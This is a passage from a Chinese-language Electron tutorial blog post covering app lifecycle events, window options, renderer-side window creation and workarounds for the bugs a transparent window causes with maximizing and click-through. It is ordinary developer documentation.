<h3 id="will-quit"><a href="#will-quit" class="headerlink" title="will-quit"></a>will-quit</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">on</span>(<span class="string">&#x27;will-quit&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;will-quit&quot;</span>)</span><br><span class="line">    <span class="comment">//在关闭窗口都已经关闭并且应用程序退出时</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="quit"><a href="#quit" class="headerlink" title="quit"></a>quit</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">on</span>(<span class="string">&quot;quit&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;quit&quot;</span>)</span><br><span class="line">    globalShortcut.<span class="title function_">unregister</span>(<span class="string">&quot;ctrl+g&quot;</span>);</span><br><span class="line">    globalShortcut.<span class="title function_">unregisterAll</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="closed"><a href="#closed" class="headerlink" title="closed"></a>closed</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">mainWindow.<span class="title function_">on</span>(<span class="string">&quot;closed&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;closed&#x27;</span>)</span><br><span class="line">    mainWindow = <span class="literal">null</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="窗口"><a href="#窗口" class="headerlink" title="窗口"></a>窗口</h2><h3 id="窗口尺寸"><a href="#窗口尺寸" class="headerlink" title="窗口尺寸"></a>窗口尺寸</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">whenReady</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> mainWindow = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">        <span class="attr">x</span>: <span class="number">100</span>,</span><br><span class="line">        <span class="attr">y</span>: <span class="number">100</span>,</span><br><span class="line">        <span class="attr">width</span>: <span class="number">800</span>,</span><br><span class="line">        <span class="attr">height</span>: <span class="number">600</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p><code>x</code>：距离屏幕左上角横向距离</p>
<p><code>y</code>：距离屏幕左上角纵向距离</p>
<p><code>width</code>、<code>height</code>：窗口的宽度、高度</p>
<p><code>maxWidth</code>、<code>maxHeight</code>、<code>minWidth</code>、<code>minHeight</code>：窗口的最大、最小宽度、高度</p>
<p><code>show</code>：<code>true</code>&#x2F;<code>false</code>，窗口创建后是否直接显示</p>
<p><code>resizable</code>：<code>true</code>&#x2F;<code>false</code>，是否能够调整大小</p>
<p><code>autoHideMenuBar</code>：隐藏默认的菜单栏</p>
<p><code>frame</code>：是否显示非客户区</p>
<p><code>title</code>：如果index.html里没有设置title则使用这个</p>
<p><code>icon</code>：<code>.ico</code>图标的相对路径</p>
<p><code>transparent</code>：窗口是否全透明（需要搭配frame: false使用）</p>
<p>因为创建好窗口后再加载index.html需要一段时间，所以先让窗口隐藏，在程序加载完html后再展示出来，这样就不会有首页白屏的现象出现</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">whenReady</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> mainWindow = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">        <span class="attr">width</span>: <span class="number">800</span>,</span><br><span class="line">        <span class="attr">height</span>: <span class="number">600</span>,</span><br><span class="line">        <span class="attr">show</span>: <span class="literal">false</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">    mainWindow.<span class="title function_">loadFile</span>(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    mainWindow.<span class="title function_">once</span>(<span class="string">&#x27;ready-to-show&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        mainWindow.<span class="title function_">show</span>()</span><br><span class="line">    &#125;)</span><br><span class="line">    mainWindow.<span class="title function_">on</span>(<span class="string">&#x27;closed&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;mainWindow closed&#x27;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="创建新窗口"><a href="#创建新窗口" class="headerlink" title="创建新窗口"></a>创建新窗口</h3><p>这里采取一个点击一个按钮，弹出一个新窗口的方式实现</p>
<p>首先，优化一下目录结构，采用与微信小程序相同的目录结构，方便管理</p>
<img src="/2025/01/23/Electron/image-20250124145917967.png" alt="image-20250124145917967" style="zoom:50%;">

<p>首先在main.js中添加一个按钮</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;openNeWindow&quot;</span>&gt;</span>打开一个新窗口<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在index.js中添加对按钮的监听事件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>,<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> btn  = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;openNeWindow&#x27;</span>)</span><br><span class="line">    btn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>,<span class="function">() =&gt;</span> &#123;</span><br><span class="line">		<span class="comment">/////////////////////////////</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>那么现在我想在这个index.js中，像主进程main.js那样创建一个窗口，应该来说也是和main.js一样，用require导入electron就可以了，那么导入一下试试</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> o = <span class="built_in">require</span>(<span class="string">&#x27;electron&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><code>ctrl + shift + I</code>打开调试，可以看到require是没有被定义的，所以这也说明了在渲染进程中是没法直接使用nodejs的，这也是Electron出于安全性的考虑</p>
<img src="/2025/01/23/Electron/image-20250124150735680.png" alt="image-20250124150735680" style="zoom:40%;">

<p>所以这就需要我们的main.js允许一下我的渲染进程也可以使用nodejs，在创建窗口时有一些属性，可以添加一个<code>webPreferences</code>，然后在里面添加<code>nodeIntegration: true</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> mainWindow = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">    <span class="attr">width</span>: <span class="number">800</span>,</span><br><span class="line">    <span class="attr">height</span>: <span class="number">600</span>,</span><br><span class="line">    <span class="attr">webPreferences</span>: &#123;</span><br><span class="line">        <span class="attr">nodeIntegration</span>: <span class="literal">true</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>此时require是没问题了，但是添加了以下代码仍然没法创建窗口</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> btn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;openNeWindow&#x27;</span>)</span><br><span class="line">    btn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> win = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">            <span class="attr">width</span>: <span class="number">800</span>,</span><br><span class="line">            <span class="attr">height</span>: <span class="number">600</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">        win.<span class="title function_">loadURL</span>(<span class="string">&#x27;pages/homepage/homepage.html&#x27;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    win.<span class="title function_">on</span>(<span class="string">&#x27;closed&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        win = <span class="literal">null</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>这也是Electron基于安全性的考虑，渲染进程是没法直接用主进程的一些模块，那么就需要用到<code>remote</code>模块，在main.js中添加<code>enableRemoteModule: true</code>，然后在渲染进程index.js中导入模块时直接解构出remote就可以了，然后创建窗口时使用<code>remote.BrowserWindow</code>来创建</p>
<p>完整的index.js如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; remote &#125; = <span class="built_in">require</span>(<span class="string">&#x27;electron&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> btn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;openNeWindow&#x27;</span>)</span><br><span class="line">    btn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> win = <span class="keyword">new</span> remote.<span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">            <span class="attr">width</span>: <span class="number">800</span>,</span><br><span class="line">            <span class="attr">height</span>: <span class="number">600</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">        win.<span class="title function_">loadURL</span>(<span class="string">&#x27;pages/homepage/homepage.html&#x27;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    win.<span class="title function_">on</span>(<span class="string">&#x27;closed&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        win = <span class="literal">null</span> <span class="comment">// 释放</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>完整的main.js如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; app, <span class="title class_">BrowserWindow</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;electron&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">whenReady</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> mainWindow = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">        <span class="attr">width</span>: <span class="number">800</span>,</span><br><span class="line">        <span class="attr">height</span>: <span class="number">600</span>,</span><br><span class="line">        <span class="attr">webPreferences</span>: &#123;</span><br><span class="line">            <span class="attr">nodeIntegration</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">enableRemoteModule</span>: <span class="literal">true</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    mainWindow.<span class="title function_">loadFile</span>(<span class="string">&#x27;pages/index/index.html&#x27;</span>)</span><br><span class="line">    mainWindow.<span class="title function_">once</span>(<span class="string">&#x27;ready-to-show&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        mainWindow.<span class="title function_">show</span>()</span><br><span class="line">    &#125;)</span><br><span class="line">    mainWindow.<span class="title function_">on</span>(<span class="string">&#x27;closed&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;mainWindow closed&#x27;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">on</span>(<span class="string">&#x27;window-all-closed&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;app window-all-closed&#x27;</span>)</span><br><span class="line">    app.<span class="title function_">quit</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>但是从Electron14开始，enableRemoteModule选项已被移出，remote模块已经被完全弃用了</p>
<p>因此，如果你正在使用 Electron 14 或更高版本，你需要使用 contextBridge 和 ipcRenderer 来替代 remote 模块的功能。</p>
<h3 id="transparent属性的bug"><a href="#transparent属性的bug" class="headerlink" title="transparent属性的bug"></a>transparent属性的bug</h3><h4 id="bug简介"><a href="#bug简介" class="headerlink" title="bug简介"></a>bug简介</h4><p>创建窗口时会有一个transparent属性，如果设置为true，则会让整个应用中没有元素的地方都变成透明的（但是鼠标点击穿透不了）</p>
<p>但是此时如果你添加了一个按钮用来最大化窗口（<code>maximize</code>或<code>unmaximize</code>）你会发现你能够最大化（最大化窗口）但是没法恢复（窗口模式），这貌似是Electron自古以来的bug。也就是说，如果打印<code>mainWindow.isMaximized()</code>这个东西他会一直返回false，所以mainWindow的transparent设置为true后，窗口会被认为一直认为是没有最大化状态。并且此时调用<code>mainWindow.unmaximize()</code>是完全没有用的</p>
<h4 id="想出来的解决方法"><a href="#想出来的解决方法" class="headerlink" title="想出来的解决方法"></a>想出来的解决方法</h4><p>我自己记录是否最大化了，然后最大化的时候还是调用<code>mainWindow.maximize()</code>方法，unmaximize的时候直接重启一个窗口不就完了</p>
<p>首先我创建的这个程序本身不是一开始就最大化的，所以，先定义一个全局变量<code>let ism = false</code>，用来记录最大化状态</p>
<p>然后在渲染进程点击最大化按钮时向主进程通信 （下面这段函数从下往上看）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> mainWindow = <span class="literal">null</span> <span class="comment">// 这里记录一下，因为checkWindowScreen()函数要传入窗口</span></span><br><span class="line"><span class="keyword">let</span> xx = <span class="number">0</span> <span class="comment">// 记录之前程序所在x位置（因为可能涉及多显示器）</span></span><br><span class="line"><span class="keyword">let</span> yy = <span class="number">0</span> <span class="comment">// 记录之前程序所在y位置</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">isPointInBounds</span>(<span class="params">x, y, bounds</span>) &#123; <span class="comment">// checkWindowScreen() 的辅助函数</span></span><br><span class="line">    <span class="keyword">return</span> x &gt;= bounds.<span class="property">x</span> &amp;&amp; x &lt;= bounds.<span class="property">x</span> + bounds.<span class="property">width</span> &amp;&amp;</span><br><span class="line">        y &gt;= bounds.<span class="property">y</span> &amp;&amp; y &lt;= bounds.<span class="property">y</span> + bounds.<span class="property">height</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkWindowScreen</span>(<span class="params"><span class="variable language_">window</span></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> bounds = <span class="variable language_">window</span>.<span class="title function_">getBounds</span>();</span><br><span class="line">    <span class="keyword">const</span> displays = screen.<span class="title function_">getAllDisplays</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; displays.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> display = displays[i];</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">isPointInBounds</span>(bounds.<span class="property">x</span>, bounds.<span class="property">y</span>, display.<span class="property">bounds</span>)) &#123;</span><br><span class="line">            <span class="comment">// console.log(`窗口当前在屏幕 $&#123;i + 1&#125;`);</span></span><br><span class="line">            xx = bounds.<span class="property">x</span>; <span class="comment">// 记录窗口在屏幕上的x坐标</span></span><br><span class="line">            yy = bounds.<span class="property">y</span>; <span class="comment">// 记录窗口在屏幕上的y坐标</span></span><br><span class="line">            <span class="variable language_">window</span>.<span class="property">screenIndex</span> = i; <span class="comment">// 更新窗口所在的屏幕索引</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;窗口不在任何已知的屏幕中&#x27;</span>); <span class="comment">// 窗口移出屏幕会触发这个，不过最大化的时候一定不会触发这个</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">cw</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> mainWindow = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">        <span class="attr">x</span>: xx + <span class="number">400</span>,</span><br><span class="line">        <span class="attr">y</span>: yy + <span class="number">300</span>,</span><br><span class="line">        <span class="attr">width</span>: <span class="number">800</span>,</span><br><span class="line">        <span class="attr">height</span>: <span class="number">600</span>,</span><br><span class="line">        <span class="attr">show</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">autoHideMenuBar</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">frame</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">transparent</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">alwaysOnTop</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">webPreferences</span>: &#123;</span><br><span class="line">            <span class="attr">nodeIntegration</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">preload</span>: path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;preload.js&#x27;</span>),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> mainWindow</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ipcMain.<span class="title function_">on</span>(<span class="string">&#x27;maximize&#x27;</span>, <span class="function">(<span class="params">event, value</span>) =&gt;</span> &#123; <span class="comment">//////////////// 渲染进程告诉主进程要maximize或unmaximize了</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(mainWindow.<span class="title function_">isMaximized</span>())</span><br><span class="line">    <span class="keyword">if</span> (!ism) &#123;</span><br><span class="line">        ism = <span class="literal">true</span></span><br><span class="line">        mainWindow.<span class="title function_">maximize</span>() <span class="comment">// 这个方法还可以使用</span></span><br><span class="line">        mainWindow.<span class="property">resizable</span> = <span class="literal">false</span> </span><br><span class="line">        mainWindow.<span class="property">movable</span> = <span class="literal">false</span> <span class="comment">// 需要将resizable属性和movable属性设置成fasle，不然最大化之后仍然能拖动这个窗口或放大缩小，那样的话还得判断是否改变了大小，再通知渲染进程修改右上角图标，更麻烦。不想这样也可以，自己实现一个监听mainWindow(&#x27;move&#x27; =&gt; &#123;&#125;)方法就可以，然后处理程序在屏幕上的位置，也能实现和普通程序本来的那种拖到最顶上最大化，拖离最顶部还原的操作，不过没(lan)必(de)要(zuo)</span></span><br><span class="line">        event.<span class="title function_">reply</span>(<span class="string">&#x27;receive-maximize-message&#x27;</span>, <span class="literal">true</span>) <span class="comment">// 这里用来回复渲染进程改变图标</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// mainWindow.unmaximize() // 这个方法不能用</span></span><br><span class="line">        ism = <span class="literal">false</span></span><br><span class="line">        mainWindow.<span class="title function_">close</span>() <span class="comment">// 关闭当前窗口 // 不要使用app.quit()退出整个程序</span></span><br><span class="line">        mainWindow = <span class="title function_">cw</span>() <span class="comment">// 这个函数用来创建新窗口 **上面有定义** </span></span><br><span class="line">        mainWindow.<span class="title function_">loadFile</span>(<span class="string">&#x27;pages/index/index.html&#x27;</span>)</span><br><span class="line">        mainWindow.<span class="title function_">once</span>(<span class="string">&#x27;ready-to-show&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            mainWindow.<span class="title function_">show</span>() <span class="comment">// 减少主页白屏概率</span></span><br><span class="line">        &#125;)</span><br><span class="line">        mainWindow.<span class="title function_">on</span>(<span class="string">&#x27;maximize&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">checkWindowScreen</span>(mainWindow) <span class="comment">// 检查当前程序在哪一个显示器上 **上面有定义** 这个函数不仅在这里要监听，在程序第一次打开创建mianWindow时也要监听，也就是在这个ipc外面的那个mainWindow也要监听`maximize`</span></span><br><span class="line">        &#125;)</span><br><span class="line">        event.<span class="title function_">reply</span>(<span class="string">&#x27;receive-maximize-message&#x27;</span>, <span class="literal">false</span>) <span class="comment">// 告诉渲染进程创建成功了，可以进行一些后续操作</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>以上代码就是最小化的时候直接重启一个窗口，不足就是肯定不连贯，毕竟关闭了一个窗口，因为涉及到多显示器判断，所以这段代码看起来比较长，你如果懒的判断多显示器，直接关了重开就行了</p>
<p>再就是你肯定会问：<strong>重新打开之后肯定不是上个页面所在的位置啊</strong>，比如一个设置页，我最大化的时候再第三个选项卡，但是重启了肯定就回到了刚开始的第一个啊</p>
<p>这个咋解决呢，那就只能在渲染进程的index.html加载的时候<code>mainWindow.loadFile(&#39;pages/index/index.html&#39;)</code>，在后面加上<code>?page=1&amp;abcabc=xxx</code>之类的，再跳转过去，然后index.js中再解析一下参数，切换一下选项卡或标签页之类的（我也没具体试过，毕竟没这个需求，只是想到了这个方法，不过应该能实现）</p>
<p>当然，这个方法确实<strong>很麻烦</strong>，但对于Electron自身的这个bug来说，目前应该只能这样解决了，上网也没找到很好的方法。</p>
<p> 下面再讲一下设置了transparent后鼠标穿透如何解决</p>
<h3 id="transparent后鼠标穿透"><a href="#transparent后鼠标穿透" class="headerlink" title="transparent后鼠标穿透"></a>transparent后鼠标穿透</h3><p>如果单纯的设置了transparent属性，鼠标是会被Electron的这个Application捕获到的，无法直接穿过Electron的这个程序点击到下面的其他东西，当然我们肯定是希望能够点到透明后边的东西</p>
<p>有这么一个属性：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">mainWindow.<span class="title function_">setIgnoreMouseEvents</span>(<span class="literal">true</span>, &#123; <span class="attr">forward</span>: <span class="literal">true</span> &#125;)</span><br></pre></td></tr></table></figure>

<p>他会让整个Electron应用忽略全部鼠标操作，完全实现鼠标穿透，但这肯定也不是我们想要的。所以就判断一下什么时候鼠标穿透，什么时候不穿透</p>
<p>这个操作我会用一下一个例子实现（gif加载不出来就等会 ~）：</p>
<p><img src="/2025/01/23/Electron/789456123.gif" alt="789456123"></p>
<span style="color: rgba(200, 50, 55); font-weight: 550;">
    学习这部分之前请先了解下面的</span><a href="#IPC通信"><span style="color: rgba(200, 50, 55); font-weight: 550;">IPC通信</span></a><span style="color: rgba(200, 50, 55); font-weight: 550;">
相关内容
</span>

<p>首先，创建mainWindow的时候，应有以下属性</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> mainWindow = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">    <span class="attr">x</span>: xx + <span class="number">400</span>, </span><br><span class="line">    <span class="attr">y</span>: yy + <span class="number">300</span>,</span><br><span class="line">    <span class="comment">// xx和yy是解决上述transparent bug时添加的，如果不需要解决上述transparent的bug则可以直接删除x和y，直接让窗口创建在屏幕中间</span></span><br><span class="line">    <span class="attr">width</span>: <span class="number">800</span>,</span><br><span class="line">    <span class="attr">height</span>: <span class="number">600</span>,</span><br><span class="line">    <span class="attr">autoHideMenuBar</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">frame</span>: <span class="literal">false</span>, <span class="comment">// 这里使用自定义非客户区</span></span><br><span class="line">    <span class="attr">transparent</span>: <span class="literal">true</span>, <span class="comment">// 背景透明</span></span><br><span class="line">    <span class="attr">alwaysOnTop</span>: <span class="literal">true</span>, <span class="comment">// 置顶窗口</span></span><br><span class="line">    <span class="attr">webPreferences</span>: &#123;</span><br><span class="line">        <span class="attr">preload</span>: path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;preload.js&#x27;</span>),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>然后我们来进行后续操作</p>
<p>首先我在preload.js中建立一个ipc通信，函数名使用<code>IgnoreMouse</code>的缩写代替了</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">contextBridge.<span class="title function_">exposeInMainWorld</span>(<span class="string">&#x27;CustomAPI&#x27;</span>, &#123;</span><br><span class="line">    <span class="title class_">IgnoreM</span>:<span class="function">() =&gt;</span> ipcRenderer.<span class="title function_">send</span>(<span class="string">&#x27;IgnoreM&#x27;</span>),</span><br><span class="line">    <span class="attr">unIgnoreM</span>:<span class="function">() =&gt;</span> ipcRenderer.<span class="title function_">send</span>(<span class="string">&#x27;unIgnoreM&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>main.js绑定这个通信：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ipcMain.<span class="title function_">on</span>(<span class="string">&#x27;IgnoreM&#x27;</span>, <span class="function">(<span class="params">event, value</span>) =&gt;</span> &#123;</span><br><span class="line">    mainWindow.<span class="title function_">setIgnoreMouseEvents</span>(<span class="literal">true</span>, &#123; <span class="attr">forward</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">ipcMain.<span class="title function_">on</span>(<span class="string">&#x27;unIgnoreM&#x27;</span>, <span class="function">(<span class="params">event, value</span>) =&gt;</span> &#123;</span><br><span class="line">    mainWindow.<span class="title function_">setIgnoreMouseEvents</span>(<span class="literal">false</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<p>看一下我的index.html的主要部分，非客户区是我自己定义的，比较长一坨</p>
<p><img src="/2025/01/23/Electron/image-20250126130348407.png" alt="image-20250126130348407"></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Custom Title Bar ############## 非客户区--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;draggableBar&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;left-box&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../src/icon.jpg&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span>Creeeeeeeeeeper.exe<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;right-box&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;close&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">svg</span> <span class="attr">t</span>=<span class="string">&quot;1737724919494&quot;</span> <span class="attr">class</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">viewBox</span>=<span class="string">&quot;0 0 1024 1024&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">p-id</span>=<span class="string">&quot;1596&quot;</span> <span class="attr">width</span>=<span class="string">&quot;13.5&quot;</span> <span class="attr">height</span>=<span class="string">&quot;13.5&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">path</span></span></span><br><span class="line"><span class="tag">                          <span class="attr">d</span>=<span class="string">&quot;M556.8 512l281.6 281.6c12.8 12.8 12.8 32 0 44.8s-32 12.8-44.8 0L512 556.8l-281.6 281.6c-12.8 12.8-32 12.8-44.8 0s-12.8-32 0-44.8l281.6-281.6L185.6 230.4c-12.8-12.8-12.8-32 0-44.8s32-12.8 44.8 0l281.6 281.6 281.6-281.6c12.8-12.8 32-12.8 44.8 0s12.8 32 0 44.8L556.8 512z&quot;</span></span></span><br><span class="line"><span class="tag">                          <span class="attr">p-id</span>=<span class="string">&quot;1597&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#8a8a8a&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;maxsize&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">svg</span> <span class="attr">t</span>=<span class="string">&quot;1737720715887&quot;</span> <span class="attr">class</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">viewBox</span>=<span class="string">&quot;0 0 1024 1024&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">p-id</span>=<span class="string">&quot;5182&quot;</span> <span class="attr">width</span>=<span class="string">&quot;13&quot;</span> <span class="attr">height</span>=<span class="string">&quot;13&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">path</span></span></span><br><span class="line"><span class="tag">                          <span 